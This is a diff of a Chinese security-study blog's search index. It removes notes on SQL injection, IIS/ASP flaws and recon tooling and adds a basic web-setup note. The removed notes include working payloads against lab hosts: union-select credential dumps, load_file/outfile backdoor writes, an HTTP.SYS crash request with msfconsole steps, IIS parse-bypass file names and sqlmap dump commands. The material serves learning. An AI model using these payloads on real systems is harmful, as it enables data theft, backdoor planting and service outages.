-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,mem_Name,mem_Password,6 from zblog.zbp_member</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p>权限高可以跨库查看其他的库，权限低就只能查看自己的，使用user()来查看是否是root用户。而决定权取决于连接的服务器。<br><br></p>
-<h2 id="PHP-MYSQL-SQL文件读写"><a href="#PHP-MYSQL-SQL文件读写" class="headerlink" title="PHP-MYSQL-SQL文件读写"></a>PHP-MYSQL-SQL文件读写</h2><p><strong>影响条件</strong>：</p>
-<ol>
-<li>当前数据库用户权限需要root，高权限</li>
-<li>secure-file-priv设置<br>
-<br></li>
-</ol>
-<p><strong>PHP中间版本有，高版本就没有了</strong></p>
-<p>“D:\phpstudy_pro\Extensions\MySQL5.7.26\my.ini” 配置写入secure_file_priv&#x3D;才能出现此漏洞，删除secure_file_priv&#x3D;就没有这个漏洞了</p>
-<p>测试不同数据库用户：root demo</p>
-<ol>
-<li><p>尝试读取</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,load_file(<span class="string">&#x27;d:\\1.txt&#x27;</span>),3,4,5,6</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>可以找到配置文件，写入后门到web里</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,<span class="string">&#x27;cypher&#x27;</span>,3,4,5,6 into outfile <span class="string">&#x27;d:\\2.txt&#x27;</span></span><br></pre></td></tr></table></figure>
-<br></li>
-</ol>
-<p><strong>读写的路径的问题</strong>：</p>
-<ol>
-<li>报错显示获取路径</li>
-<li>phpinfo页面泄漏<br>如果不知道路径思路：利用常见的默认的中间件，数据库等安装路径读取有价值信息<br>
-<br></li>
-</ol>
-<p><strong>单引号过滤绕过方式</strong><br>SQL注入语句中用单引号就不要编码，编码就不用单引号（路径，表名，数据库名等）</p>
-]]></content>
-      <categories>
-        <category>Web攻防</category>
-      </categories>
-  </entry>
-  <entry>
     <title>APP资产&amp;知识产权&amp;应用监控&amp;静态提取&amp;动态抓包&amp;动态调试</title>
     <url>/2024/03/10/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B97/</url>
     <content><![CDATA[<h2 id="名称获取App信息（爱企查-小蓝本-七麦-点点）"><a href="#名称获取App信息（爱企查-小蓝本-七麦-点点）" class="headerlink" title="名称获取App信息（爱企查&#x2F;小蓝本&#x2F;七麦&#x2F;点点）"></a>名称获取App信息（爱企查&#x2F;小蓝本&#x2F;七麦&#x2F;点点）</h2><ol>
@@ -1018,109 +1465,6 @@
 ]]></content>
       <categories>
         <category>信息打点</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>JS架构&amp;框架识别&amp;泄漏提取&amp;API接口枚举&amp;FUZZ爬虫&amp;插件项目</title>
-    <url>/2024/03/10/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B93/</url>
-    <content><![CDATA[<h2 id="什么是JS渗透测试？"><a href="#什么是JS渗透测试？" class="headerlink" title="什么是JS渗透测试？"></a>什么是JS渗透测试？</h2><p>在JavaScript中也存在变量和函数，当存在可控变量及函数调用即可参数漏洞</p>
-<p>JS开发的Web应用和PHP，Java，NET等区别在于即没有源代码，也可以通过浏览器的查看源代码获取真实的点。获取URL，获取JS敏感信息，获取代码传参等，所以相当于JS开发的WEB应用属于白盒测试（默认有源码参考），一般会在JS中寻找更多的URL地址，在分析JS代码逻辑（加密算法，APIKey配置，验证逻辑等）进行后期安全测试。<br><br></p>
-<p>前提：Web应用可以采用前端或后端语言开发</p>
-<p><strong>后端语言</strong>：PHP Java Python .NET 浏览器端看不到真实的源代码</p>
-<p><strong>前端语言</strong>：JavaScript(JS)和JS框架 浏览器端能看到真实的源代码<br><br></p>
-<p>例子：</p>
-<p>Zblog：核心功能采用PHP语言去写的，例如登录密码加密</p>
-<p>Vue.js：核心功能采用框架语法JS写的，例如登录密码加密，验证码<br><br></p>
-<h2 id="JS安全问题"><a href="#JS安全问题" class="headerlink" title="JS安全问题"></a>JS安全问题</h2><p>源码泄漏</p>
-<p><strong>未授权访问</strong>&#x3D;JS里面分析更多的URL访问确定接口路径，从而进入未授权访问</p>
-<p><strong>敏感Key泄漏</strong>&#x3D;JS文件中可能配置了接口信息（云应用，短信，邮件，数据库等）</p>
-<p><strong>API接口安全</strong>&#x3D;（代码中加密提交，参数传递，更多的URL路径）<br><br></p>
-<p>如何从表现中的JS提取价值信息</p>
-<p>如何从地址中，Fuzz工具来提取未知的JS文件</p>
-<p>如何从JS开放框架WebPack进行测试<br><br></p>
-<h2 id="流行的JS框架有那些？"><a href="#流行的JS框架有那些？" class="headerlink" title="流行的JS框架有那些？"></a>流行的JS框架有那些？</h2><p>Vue.js, Node.js, jQuery, Angular等<br><br></p>
-<h2 id="如何判定JS开发应用？"><a href="#如何判定JS开发应用？" class="headerlink" title="如何判定JS开发应用？"></a>如何判定JS开发应用？</h2><p>插件Wappalyzer</p>
-<p>源程序代码简短</p>
-<p>引入多个JS文件</p>
-<p>一般有&#x2F;static&#x2F;js&#x2F;app.js等顺序的JS文件</p>
-<p>一般cookie中有connect.sid<br><br></p>
-<h2 id="如何获取更多的JS文件？"><a href="#如何获取更多的JS文件？" class="headerlink" title="如何获取更多的JS文件？"></a>如何获取更多的JS文件？</h2><p><strong>手工</strong>-浏览器搜索</p>
-<p><strong>半自动</strong>-Burpsuite插件</p>
-<p><strong>工具化</strong>-各类提取&amp;Fuzz项目<br><br></p>
-<h2 id="前端架构-手工搜索分析"><a href="#前端架构-手工搜索分析" class="headerlink" title="前端架构-手工搜索分析"></a>前端架构-手工搜索分析</h2><p>打开检查，网站全局搜索分析</p>
-<p>全局搜索，找连接地址和路径</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">src=</span><br><span class="line">path=</span><br><span class="line">method:<span class="string">&quot;get&quot;</span></span><br><span class="line">http.get(<span class="string">&quot;)</span></span><br><span class="line"><span class="string">method:&quot;</span>post<span class="string">&quot;</span></span><br><span class="line"><span class="string">http.post(&quot;</span>)</span><br><span class="line">.ajax</span><br><span class="line">http://service.httppost</span><br><span class="line">http://service.httpget</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<h2 id="前端架构-半自动Burp分析"><a href="#前端架构-半自动Burp分析" class="headerlink" title="前端架构-半自动Burp分析"></a>前端架构-半自动Burp分析</h2><p><strong>插件一</strong>：<a href="https://github.com/ScriptKid-Beta/Unexpected_information">Unexpected_information</a><br>用来标记请求包中的一些敏感信息、JS接口和一些特殊字段，<br>防止我们疏忽了一些数据包，使用它可能会有意外的收获信息。<br><br></p>
-<p><strong>插件二</strong>：<a href="https://github.com/gh0stkey/HaE">HaE</a><br>基于BurpSuite插件JavaAPI开发的请求高亮标记与信息提取的辅助型插件。该插件可以通过自定义正则的方式匹配响应报文或请求报文，可以自行决定符合该自定义正则匹配的相应请求是否需要高亮标记、信息提取。<br><br></p>
-<h2 id="前端架构-自动化项目分析"><a href="#前端架构-自动化项目分析" class="headerlink" title="前端架构-自动化项目分析"></a>前端架构-自动化项目分析</h2><ol>
-<li><p>用的最多，功能最差的：<a href="https://github.com/Threezh1/JSFinder">JSFinder</a>-从表现中JS中提取URL或者敏感数据<br>一款用作快速在网站的JS文件中提取URL，子域名的工具，然后挑选测试，进入，看看能不能未授权访问</p>
-</li>
-<li><p>Jsfinder的升级版：<a href="https://github.com/pingc0y/URLFinder">URLFinder</a>-从表现中JS中提取URL或者敏感数据<br>一款用于快速提取检测页面中JS与URL的工具。<br>功能类似于JSFinder，但JSFinder好久没更新了。</p>
-</li>
-<li><p><a href="https://github.com/p1g3/JSINFO-SCAN">JSINFO-SCAN</a>-从表现中JS中提取URL或者敏感数据<br>递归爬取域名(netloc&#x2F;domain)，以及递归从JS中获取信息的工具</p>
-</li>
-<li><p>很好用的浏览器插件：<a href="https://github.com/momosecurity/FindSomething">FindSomething</a><br>从表现中JS中提取URL或者敏感数据<br>该工具是用于快速在网页的html源码或JS代码中提取一些有趣的信息的浏览器插件，<br>包括请求的资源、接口的URL，请求的IP和域名，泄漏的证件号、手机号、邮箱等信息。</p>
-</li>
-<li><p><a href="https://github.com/ffuf/ffuf">Ffuf</a>-爆破找到更多的JS文件分析更多的信息<br>各种字典：<a href="https://wordlists.assetnote.io/">https://wordlists.assetnote.io</a><br>功能强大的模糊化工具，用它来FUZZ模糊化js文件。</p>
-</li>
-<li><p><a href="https://github.com/rtcatc/Packer-Fuzzer">Packer-Fuzzer</a>-针对JS框架开发打包器Webpack检测，在浏览器插件杂项里面有webpack就能使用这个工具了<br>一款针对Webpack等前端打包工具所构造的网站进行快速、高效安全检测的扫描工具，然后就能生成报告</p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>信息打点</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>ASP应用&amp;HTTP.SYS&amp;短文件&amp;文件解析&amp;Access注入&amp;数据库泄漏</title>
-    <url>/2024/03/14/Web%E6%94%BB%E9%98%B21/</url>
-    <content><![CDATA[<h2 id="ASP-默认安装-MDB数据库泄漏下载"><a href="#ASP-默认安装-MDB数据库泄漏下载" class="headerlink" title="ASP-默认安装-MDB数据库泄漏下载"></a>ASP-默认安装-MDB数据库泄漏下载</h2><p>由于大部分ASP程序与ACCESS数据库搭建，但ACCESS没有账号密码，无需连接，都在脚本文件中定义配置好数据库路径就可以用了，不需要额外配置安装数据库，所以大部分提前固定好的数据库路径如默认未修改，当攻击者知道数据库的完整路径，可远程下载后解数据实现攻击。例如早期的Windows 2003的fyblogs_3.0网站。<br><br></p>
-<h2 id="ASP-中间件-CVE-短文件-解析-写权限"><a href="#ASP-中间件-CVE-短文件-解析-写权限" class="headerlink" title="ASP-中间件-CVE&amp;短文件&amp;解析&amp;写权限"></a>ASP-中间件-CVE&amp;短文件&amp;解析&amp;写权限</h2><p><strong>HTTP.SYS（CVE-2015-1635）</strong></p>
-<ol>
-<li>漏洞描述<br>远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。 成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。然后会直接蓝屏。</li>
-<li>影响版本<br>Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2</li>
-<li>漏洞利用条件<br>安装了IIS6.0以上的Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2版本</li>
-<li>漏洞复现<br>curl -v 192.168.126.130 -H “Host:192.168.126.130” -H “Range:bytes&#x3D;0-18446744073709551615”</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use auxiliary/dos/http/ms15_034_ulonglongadd</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.126.130</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<br>
-
-<p><strong>IIS短文件</strong></p>
-<ol>
-<li>此漏洞实际是由HTTP请求中旧DOS 8.3名称约定(SFN)的代字符(~)波浪号引起的。它允许远程攻击者在Web根目录下公开文件和前6位文件夹名称(不应该可被访问)。攻击者可以找到通常无法从外部直接访问的重要文件,并获取有关应用程序基础结构的信息。</li>
-<li>漏洞成因:<br>为了兼容16位MS-DOS程序,Windows为文件名较长的文件(和文件夹)生成了对应的windows 8.3短文件名。在Windows下查看对应的短文件名,可以使用命令dir &#x2F;x</li>
-<li>应用场景：<br>后台路径获取，数据库文件获取，其他敏感文件获取等</li>
-<li>利用工具：<br><a href="https://github.com/irsdl/IIS-ShortName-Scanner">IIS-ShortName-Scanner</a><br><a href="https://github.com/lijiejie/IIS_shortname_Scanner">IIS_shortname_Scanner</a><br>
-<br></li>
-</ol>
-<p><strong>IIS文件解析</strong><br>IIS 6 解析漏洞<br>1.该版本默认会将1.asp;.jpg 此种格式的文件名，当成Asp解析<br>2.该版本默认会将1.asp文件名下的所有文件当成Asp解析<br>如：<br>logo.asp;.jpg<br>xx.asp&#x2F;logo.jpg<br><br></p>
-<p><strong>IIS 7.x 解析漏洞</strong><br>在一个文件路径(&#x2F;xx.jpg)后面加上&#x2F;xx.php会将&#x2F;xx.jpg&#x2F;xx.php 解析为php文件<br>应用场景：配合文件上传获取Webshell<br><br></p>
-<p><strong>IIS写权限</strong><br>IIS&lt;&#x3D;6.0，老漏洞，目录权限开启写入，开启WebDAV，设置为允许<br><a href="https://cloud.tencent.com/developer/article/2050105">参考利用</a><br><br></p>
-<h2 id="ASP-SQL注入-SQLMAP使用-ACCESS注入"><a href="#ASP-SQL注入-SQLMAP使用-ACCESS注入" class="headerlink" title="ASP-SQL注入-SQLMAP使用 &amp; ACCESS注入"></a>ASP-SQL注入-SQLMAP使用 &amp; ACCESS注入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> top 1 * from aboutusclass <span class="built_in">where</span> classid=<span class="string">&quot;&amp;classid&amp;&quot;</span> order by OrderID</span><br><span class="line"></span><br><span class="line"><span class="comment">## Pic.asp?classid=3带入</span></span><br><span class="line"><span class="keyword">select</span> top 1 * from aboutusclass <span class="built_in">where</span> classid=<span class="string">&quot;&amp;3&amp;&quot;</span> order by OrderID</span><br></pre></td></tr></table></figure>
-
-<p><strong>重新定义</strong>：SQL注入对用户的输入的数据没有过滤，导致重新定义SQL执行（攻击者定义想要的执行结果语句）由于这个SQL语句是在数据中执行，什么数据库什么SOL语句或有什么SOL执行功能，由数据库类型决定所以说为什么注入，要叫做数据库注入，要区分什么数据库。<br><br></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> top 1 * from aboutusclass <span class="built_in">where</span> classid=<span class="string">&quot;&amp;3&amp;&quot;</span> union <span class="keyword">select</span> <span class="comment">#&quot;&amp;&quot; order by OrderID</span></span><br></pre></td></tr></table></figure>
-
-<p><a href="http://192.168.126.129:89/Pic.asp?classid=3">http://192.168.126.129:89/Pic.asp?classid=3</a> 正常</p>
-<p><a href="http://192.168.126.131:89/Pic.asp?classid=3dsad">http://192.168.126.131:89/Pic.asp?classid=3dsad</a> 错误</p>
-<p><a href="http://192.168.126.131:89/Pic.asp?classid=3dsaasdasdad">http://192.168.126.131:89/Pic.asp?classid=3dsaasdasdad</a> 错误</p>
-<p>证明可能有数据库注入漏洞，但是也有可是是容错页面404代码的逻辑设置<br><br></p>
-<p><strong>Access</strong><br>&nbsp;&nbsp;&nbsp;表名<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;列名（字段）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;数据</p>
-<br>
-
-<p>ACCESS数据库无管理帐号密码，顶级架构为表名，列名（字段），数据，所以在注入猜解中一般采用字典猜解表和列再获取数据，猜解简单但又可能出现猜解不到的情况，由于Access数据库在当前安全发展中已很少存在，故直接使用SQLMAP注入，后续再说其他。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.126.129:89/Pic.asp?classid=3&quot;</span> --tables //获取表名</span><br><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.126.129:89/Pic.asp?classid=3&quot;</span> --columns -T admin //获取admin表名下的列名</span><br><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.126.129:89/Pic.asp?classid=3&quot;</span> --dump -C <span class="string">&quot;&quot;</span> -T admin  //获取表名下的列名数据</span><br></pre></td></tr></table></figure>
-<br>
-
-<p><strong>目录扫描</strong>：字典去跑</p>
-<p><strong>IIS短文件</strong>：利用漏洞探针</p>
-<p><strong>网站爬虫</strong>：获取架构中的目录和文件路径进行分析</p>
-]]></content>
-      <categories>
-        <category>Web攻防</category>
       </categories>
   </entry>
   <entry>
@@ -1301,312 +1645,55 @@
       </categories>
   </entry>
   <entry>
-    <title>Web应用&amp;企业产权&amp;指纹识别&amp;域名资产&amp;网络空间&amp;威胁情报</title>
-    <url>/2024/03/10/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B91/</url>
-    <content><![CDATA[<h2 id="寻找漏洞补天"><a href="#寻找漏洞补天" class="headerlink" title="寻找漏洞补天"></a>寻找漏洞<a href="https://www.butian.net/">补天</a></h2><table>
-<thead>
-<tr>
-<th>类别</th>
-<th>名称</th>
-<th>地址</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>企业信息</td>
-<td>天眼查</td>
-<td><a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></td>
-</tr>
-<tr>
-<td>企业信息</td>
-<td>小蓝本</td>
-<td><a href="https://www.xiaolanben.com/">https://www.xiaolanben.com/</a></td>
-</tr>
-<tr>
-<td>企业信息</td>
-<td>爱企查</td>
-<td><a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></td>
-</tr>
-<tr>
-<td>企业信息</td>
-<td>企查查</td>
-<td><a href="https://www.qcc.com/">https://www.qcc.com/</a></td>
-</tr>
-<tr>
-<td>企业信息</td>
-<td>国外企查</td>
-<td><a href="https://opencorporates.com/">https://opencorporates.com/</a></td>
-</tr>
-<tr>
-<td>企业信息</td>
-<td>启信宝</td>
-<td><a href="https://www.qixin.com/">https://www.qixin.com/</a></td>
-</tr>
-<tr>
-<td>备案信息</td>
-<td>备案信息查询</td>
-<td><a href="http://www.beianx.cn/">http://www.beianx.cn/</a></td>
-</tr>
-<tr>
-<td>备案信息</td>
-<td>备案管理系统</td>
-<td><a href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a></td>
-</tr>
-<tr>
-<td>公众号信息</td>
-<td>搜狗微信搜索</td>
-<td><a href="https://weixin.sogou.com/">https://weixin.sogou.com/</a></td>
-</tr>
-<tr>
-<td>注册域名</td>
-<td>域名注册查询</td>
-<td><a href="https://buy.cloud.tencent.com/domain">https://buy.cloud.tencent.com/domain</a></td>
-</tr>
-<tr>
-<td>IP反查</td>
-<td>IP反查域名</td>
-<td><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></td>
-</tr>
-<tr>
-<td>IP反查</td>
-<td>IP反查域名</td>
-<td><a href="http://dns.bugscaner.com/">http://dns.bugscaner.com/</a></td>
-</tr>
-<tr>
-<td>DNS数据</td>
-<td>dnsdumpster</td>
-<td><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></td>
-</tr>
-<tr>
-<td>证书查询</td>
-<td>CertificateSearch</td>
-<td><a href="https://crt.sh/">https://crt.sh/</a></td>
-</tr>
-<tr>
-<td>网络空间</td>
-<td>FOFA</td>
-<td><a href="https://fofa.info/">https://fofa.info/</a></td>
-</tr>
-<tr>
-<td>网络空间</td>
-<td>全球鹰</td>
-<td><a href="http://hunter.qianxin.com/">http://hunter.qianxin.com/</a></td>
-</tr>
-<tr>
-<td>网络空间</td>
-<td>360</td>
-<td><a href="https://quake.360.cn/quake/#/index">https://quake.360.cn/quake/#/index</a></td>
-</tr>
-<tr>
-<td>威胁情报</td>
-<td>微步在线 情报社区</td>
-<td><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></td>
-</tr>
-<tr>
-<td>威胁情报</td>
-<td>奇安信 威胁情报中心</td>
-<td><a href="https://ti.qianxin.com/">https://ti.qianxin.com/</a></td>
-</tr>
-<tr>
-<td>威胁情报</td>
-<td>360 威胁情报中心</td>
-<td><a href="https://ti.360.cn/#/homepage">https://ti.360.cn/#/homepage</a></td>
-</tr>
-<tr>
-<td>枚举解析</td>
-<td>在线子域名查询</td>
-<td><a href="http://tools.bugscaner.com/subdomain/">http://tools.bugscaner.com/subdomain/</a></td>
-</tr>
-<tr>
-<td>枚举解析</td>
-<td>DNSGrep子域名查询</td>
-<td><a href="https://www.dnsgrep.cn/subdomain">https://www.dnsgrep.cn/subdomain</a></td>
-</tr>
-<tr>
-<td>枚举解析</td>
-<td>工具强大的子域名收集器</td>
-<td><a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></td>
-</tr>
-<tr>
-<td>指纹识别</td>
-<td>在线cms指纹识别</td>
-<td><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></td>
-</tr>
-<tr>
-<td>指纹识别</td>
-<td>Wappalyzer</td>
-<td><a href="https://github.com/AliasIO/wappalyzer">https://github.com/AliasIO/wappalyzer</a></td>
-</tr>
-<tr>
-<td>指纹识别</td>
-<td>TideFinger潮汐</td>
-<td><a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a></td>
-</tr>
-<tr>
-<td>指纹识别</td>
-<td>云悉指纹</td>
-<td><a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></td>
-</tr>
-<tr>
-<td>指纹识别</td>
-<td>WhatWeb</td>
-<td><a href="https://github.com/urbanadventurer/WhatWeb">https://github.com/urbanadventurer/WhatWeb</a></td>
-</tr>
-<tr>
-<td>指纹识别</td>
-<td>数字观星Finger-P</td>
-<td><a href="https://fp.shuziguanxing.com/#/">https://fp.shuziguanxing.com/#/</a></td>
-</tr>
-<tr>
-<td>网络空间</td>
-<td>钟馗之眼</td>
-<td><a href="https://www.zoomeye.org/?R1nG">https://www.zoomeye.org/?R1nG</a></td>
-</tr>
-<tr>
-<td>网络空间</td>
-<td>零零信安</td>
-<td><a href="https://0.zone/">https://0.zone/</a></td>
-</tr>
-<tr>
-<td>网络空间</td>
-<td>Shodan</td>
-<td><a href="https://www.shodan.io/">https://www.shodan.io/</a></td>
-</tr>
-<tr>
-<td>网络空间</td>
-<td>Censys</td>
-<td><a href="https://censys.io/">https://censys.io/</a></td>
-</tr>
-<tr>
-<td>网络空间</td>
-<td>ONYPHE</td>
-<td><a href="https://www.onyphe.io/">https://www.onyphe.io/</a></td>
-</tr>
-<tr>
-<td>网络空间</td>
-<td>FullHunt</td>
-<td><a href="https://fullhunt.io/">https://fullhunt.io/</a></td>
-</tr>
-<tr>
-<td>网络空间</td>
-<td>Soall Search Engine</td>
-<td><a href="https://soall.org/">https://soall.org/</a></td>
-</tr>
-<tr>
-<td>网络空间</td>
-<td>Netlas</td>
-<td><a href="https://app.netlas.io/responses/">https://app.netlas.io/responses/</a></td>
-</tr>
-<tr>
-<td>网络空间</td>
-<td>Leakix</td>
-<td><a href="https://leakix.net/">https://leakix.net/</a></td>
-</tr>
-<tr>
-<td>网络空间</td>
-<td>DorkSearch</td>
-<td><a href="https://dorksearch.com/">https://dorksearch.com/</a></td>
-</tr>
-<tr>
-<td>威胁情报</td>
-<td>VirusTotal在线查杀平台</td>
-<td><a href="https://www.virustotal.com/gui/">https://www.virustotal.com/gui/</a></td>
-</tr>
-<tr>
-<td>威胁情报</td>
-<td>VenusEye 威胁情报中心</td>
-<td><a href="https://www.venuseye.com.cn/">https://www.venuseye.com.cn/</a></td>
-</tr>
-<tr>
-<td>威胁情报</td>
-<td>绿盟科技 威胁情报云</td>
-<td><a href="https://ti.nsfocus.com/">https://ti.nsfocus.com/</a></td>
-</tr>
-<tr>
-<td>威胁情报</td>
-<td>IBM 情报中心</td>
-<td><a href="https://exchange.xforce.ibmcloud.com/">https://exchange.xforce.ibmcloud.com/</a></td>
-</tr>
-<tr>
-<td>威胁情报</td>
-<td>天际友盟安全智能平台</td>
-<td><a href="https://redqueen.tj-un.com/IntelHome.html">https://redqueen.tj-un.com/IntelHome.html</a></td>
-</tr>
-<tr>
-<td>威胁情报</td>
-<td>华为安全中心平台</td>
-<td><a href="https://isecurity.huawei.com/sec/web/intelligencePortal.do">https://isecurity.huawei.com/sec/web/intelligencePortal.do</a></td>
-</tr>
-<tr>
-<td>威胁情报</td>
-<td>安恒威胁情报中心</td>
-<td><a href="https://ti.dbappsecurity.com.cn/">https://ti.dbappsecurity.com.cn/</a></td>
-</tr>
-<tr>
-<td>威胁情报</td>
-<td>AlienVault</td>
-<td><a href="https://otx.alienvault.com/">https://otx.alienvault.com/</a></td>
-</tr>
-<tr>
-<td>威胁情报</td>
-<td>深信服</td>
-<td><a href="https://sec.sangfor.com.cn/analysis-platform">https://sec.sangfor.com.cn/analysis-platform</a></td>
-</tr>
-<tr>
-<td>威胁情报</td>
-<td>丁爸情报分析师的工具箱</td>
-<td><a href="http://dingba.top/">http://dingba.top/</a></td>
-</tr>
-<tr>
-<td>威胁情报</td>
-<td>听风者情报源 start.me</td>
-<td><a href="https://start.me/p/X20Apn">https://start.me/p/X20Apn</a></td>
-</tr>
-<tr>
-<td>威胁情报</td>
-<td>GreyNoise Visualizer</td>
-<td><a href="https://viz.greynoise.io/">https://viz.greynoise.io/</a></td>
-</tr>
-<tr>
-<td>威胁情报</td>
-<td>URLhaus 数据库</td>
-<td><a href="https://urlhaus.abuse.ch/browse/">https://urlhaus.abuse.ch/browse/</a></td>
-</tr>
-<tr>
-<td>威胁情报</td>
-<td>Pithus</td>
-<td><a href="https://beta.pithus.org/">https://beta.pithus.org/</a></td>
-</tr>
-</tbody></table>
-<br>
-
-<p><a href="https://forum.ywhack.com/bountytips.php?tools">棱角社区</a></p>
-<p><a href="https://chromewebstore.google.com/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg?pli=1">Wappalyzer</a><br><br></p>
-<h2 id="业务资产查询："><a href="#业务资产查询：" class="headerlink" title="业务资产查询："></a>业务资产查询：</h2><p>Web应用</p>
-<p>App应用</p>
-<p>PC端应用</p>
-<p>小程序应用</p>
-<p>微信公众号</p>
-<p>其他产品等<br><br></p>
-<h2 id="Web单域名："><a href="#Web单域名：" class="headerlink" title="Web单域名："></a>Web单域名：</h2><p><strong>备案信息</strong>：查看备案的信息和域名，在公网的都必须备案</p>
-<p><strong>企业产权</strong>：查看产权，有那些App，网站，小程序</p>
-<p><strong>注册域名</strong>：腾讯云搜索注册的域名，查看目标相关域名</p>
-<p><strong>反查解析</strong>：IP地址反查解析，见以上表格网站<br><br></p>
-<h2 id="WEB子域名："><a href="#WEB子域名：" class="headerlink" title="WEB子域名："></a>WEB子域名：</h2><p><strong>证书查询</strong>：仅限于HTTPS的网站，可以搜到后台</p>
-<p><strong>网络空间</strong>：通过使用类似fofa，奇安信，360的网络空间网站来寻找到管理后台</p>
-<p><strong>威胁情报</strong>：情报社区，奇安信查询是否安全的</p>
-<p><strong>枚举解析</strong>：使用字典批量替换前面的域名，暴力破解来查找子域名。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ping  www.baidu.com，ping xxx.baidu.com，ping xxxx.baidu.com... <span class="comment">#来暴力破解</span></span><br></pre></td></tr></table></figure>
-
-<p>可以通过接口查询以前用过的子域名，OneForAll子域名收集，集合了其他的工具的总集，很强大，但是没总和网络空间和威胁情报</p>
-<p><strong>指纹识别</strong>：潮汐和云溪指纹识别比较好，看到网站是使用什么搭建的，CDN，操作系统，CMS等等，然后可以寻找搭建软件的漏洞来攻击<br><br></p>
-<h2 id="Web架构资产："><a href="#Web架构资产：" class="headerlink" title="Web架构资产："></a>Web架构资产：</h2><p>程序语言</p>
-<p>框架源码</p>
-<p>搭建平台</p>
-<p>数据库类</p>
-<p>操作系统</p>
+    <title>Web应用&amp;架构搭建&amp;站库分离&amp;路由访问&amp;配置受限&amp;DNS解析</title>
+    <url>/2024/03/09/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A81/</url>
+    <content><![CDATA[<h2 id="常规的Web应用搭建："><a href="#常规的Web应用搭建：" class="headerlink" title="常规的Web应用搭建："></a>常规的Web应用搭建：</h2><ol>
+<li>购买服务器，购买域名（阿里云）</li>
+<li>搭建中间件（IIS）</li>
+<li>下载并上传Web程序源码（ZBlog）</li>
+<li>添加网站并绑定域名目录<br>
+<br></li>
+</ol>
+<h2 id="Web必备四大件作用"><a href="#Web必备四大件作用" class="headerlink" title="Web必备四大件作用"></a>Web必备四大件作用</h2><p>系统（Windos）<br>中间件（IIS）<br>数据库（MySQL）<br>源码（开源ZBlog）<br><br></p>
+<h2 id="网站有哪些形式展示"><a href="#网站有哪些形式展示" class="headerlink" title="网站有哪些形式展示"></a>网站有哪些形式展示</h2><p><strong>子域名模式搭建</strong>:（这是四套完全不同的程序，不同的域名就是四个目标）</p>
+<ol>
+<li>cypher.com ZBlog ASP程序</li>
+<li>cypher.sun.com WordPress PHP程序</li>
+<li>bbs.cypher.com 论讨 DZ程序</li>
+<li>oa.cypher.com OA 通达OA程序<br>
+<br></li>
+</ol>
+<p><strong>端口模式搭建</strong>:（这是两套完全不同的端口，就是两个目标）</p>
+<ol>
+<li>cypher.com ZBlog ASP程序（80默认端口）</li>
+<li>cypher.com:81 WordPress PHP程序<br>
+<br></li>
+</ol>
+<p><strong>目录模式搭建</strong>:（这是两套是在一个目录里，但是是两个目标）</p>
+<ol>
+<li>cypher.com ZBlog ASP程序</li>
+<li>cypher.com&#x2F;blog WordPress PHP程序</li>
+</ol>
+<p>或者集成软件 &amp; Docker容器 &amp; 分配站等<br><br></p>
+<h2 id="源码类型"><a href="#源码类型" class="headerlink" title="源码类型"></a>源码类型</h2><p><strong>开源</strong>：网上免费的源码，源码也分可见和不可见的（ZBlog）</p>
+<p><strong>商业</strong>：花钱找人开发，大部分源码不可见，加密（ASP加密软件），语言特性决定（Java）</p>
+<p><strong>自写</strong>：大型公司都是自写（百度，阿里都有自己的源码）</p>
+<p><strong>源码的结构组成</strong>：数据库目录，后台目录，文件目录<br><br></p>
